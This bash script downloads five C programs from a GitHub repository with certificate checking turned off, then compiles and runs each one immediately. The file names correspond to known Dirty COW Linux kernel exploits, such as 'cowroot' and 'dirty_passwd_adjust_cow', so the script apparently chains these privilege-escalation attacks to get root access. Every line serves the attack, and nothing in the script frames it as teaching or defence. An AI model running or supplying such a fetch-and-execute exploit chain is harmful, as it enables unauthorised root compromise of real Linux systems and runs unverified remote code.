#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/dirty_passwd_adjust_cow.c -O dirty_passwd_adjust_cow.c
gcc -pthread dirty_passwd_adjust_cow.c -o dirty_passwd_adjust_cow
./dirty_passwd_adjust_cow

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/c0w.c -O c0w.c
gcc -pthread c0w.c -o c0w
./c0w

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/naughtyc0w.c -O naughtyc0w.c
gcc -pthread naughtyc0w.c -o naughtyc0w
./naughtyc0w

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/dirtycow-mem.c -O dirtycow-mem.c
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
./dirtycow-mem 

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/cowroot.c -O cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot
